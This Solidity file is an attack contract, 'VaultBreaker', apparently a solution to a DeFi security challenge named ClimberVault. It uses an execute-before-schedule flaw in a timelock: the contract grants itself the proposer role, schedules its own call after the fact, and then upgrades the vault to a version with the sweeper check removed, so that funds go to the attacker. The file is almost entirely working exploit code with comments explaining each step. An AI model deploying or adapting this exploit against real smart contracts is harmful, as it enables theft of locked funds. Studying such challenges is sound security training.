// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultBreaker {

    // Stores the address of the TimeLock contract, for use across the two calls subverting the scheduler.
    address public target;
    
    // Stores a set of selectors for easy reading later.
    bytes4 constant JUST_UPGRADE = bytes4(keccak256("upgradeTo(address)"));
    bytes4 constant RESOLVE_CALL_ONE_SELECTOR = bytes4(keccak256("resolveCallOne()"));
    bytes4 constant GRANT_ROLE = bytes4(keccak256("grantRole(bytes32,address)"));
    bytes4 constant SCHEDULE = bytes4(keccak256("schedule(address[],uint256[],bytes[],bytes32)"));
    bytes4 constant EXECUTE = bytes4(keccak256("execute(address[],uint256[],bytes[],bytes32)"));
    
    // SALT value and the bytes32 of the role we want
    bytes32 constant SALT1 = 0x9fd09c38c2a5ae0a0bcd617872b735e37909ccc05c956460be7d3d03d881a0dc;
    bytes32 constant PROPOSER_ROLE = bytes32(hex"b09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1");
    
    
    function returnResolveCallOne() public pure returns (bytes memory) {
        return abi.encodeWithSelector(RESOLVE_CALL_ONE_SELECTOR);
    }
    
    function returnGetProposerRole() public view returns (bytes memory) {
        return abi.encodeWithSelector(GRANT_ROLE, PROPOSER_ROLE, address(this));
    }

    function returnUpgradeTo(address _newVault) public pure returns (bytes memory) {
        return abi.encodeWithSelector(JUST_UPGRADE, _newVault);
    }

    // first call to execute, sends grantRole and second contract call
    function callOne(address _target) external {
        // We do this here so that it can be reused during resolveCallOne
        target = _target;
        
        //repetitive but it works. Init and set target and data array values
        
        address[] memory targets = new address[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);
        targets[0] = target;
        targets[1] = address(this);
        datas[0] = returnGetProposerRole();
        datas[1] = returnResolveCallOne();
        
        // This call kicks off the execution, with the second call in the set a call to resolveCallOne, 
        // while the first sets this attacking contract as a PROPOSER (via returnGetProposerRole). As a 
        // proposer, the schedule call in the next function will succeed.
        (bool success, bytes memory _msg) = target.call(abi.encodeWithSelector(EXECUTE, targets, values, datas, SALT1));
        require(success, string(_msg));
    }

    function resolveCallOne() external {
        address[] memory targets = new address[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);
        targets[0] = target;
        targets[1] = address(this);
        datas[0] = returnGetProposerRole();
        datas[1] = returnResolveCallOne();
        
        // This call sets the previous exec call in the scheduler, in order to pass the existence check. As long as
        // the scheduled task is executed inside of the same hour, it will automatically pass the intended timelock check
        // that should exclude it. However, the exec will still fail because the Enum is initalized to a 0 value, which
        // also won't pass the check. This call causes the malicious job to be set as a real scheduled job.
        (bool success, bytes memory _msg) = target.call(abi.encodeWithSelector(SCHEDULE, targets, values, datas, SALT1));
        require(success, string(_msg));
    }

    function upgradeVault(address _oldVault, address _newVault) external {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory datas = new bytes[](1);
        targets[0] = _oldVault;
        datas[0] = returnUpgradeTo(_newVault);
        
        // schedule and execute upgrading the vault to a vault whose check on the sweeper has been removed, and the 
        // destination of the sweept is set to msg.sender.
        (bool success1, bytes memory _msg1) = target.call(abi.encodeWithSelector(SCHEDULE, targets, values, datas, SALT1));
        require(success1, string(_msg1));
        (bool success2, bytes memory _msg2) = target.call(abi.encodeWithSelector(EXECUTE, targets, values, datas, SALT1));
        require(success2, string(_msg2));
    }
}

// ClimberVault was modified with the modifier `onlySweeper` removed from `sweepFunds()`, and the target of the sweep set to `msg.sender`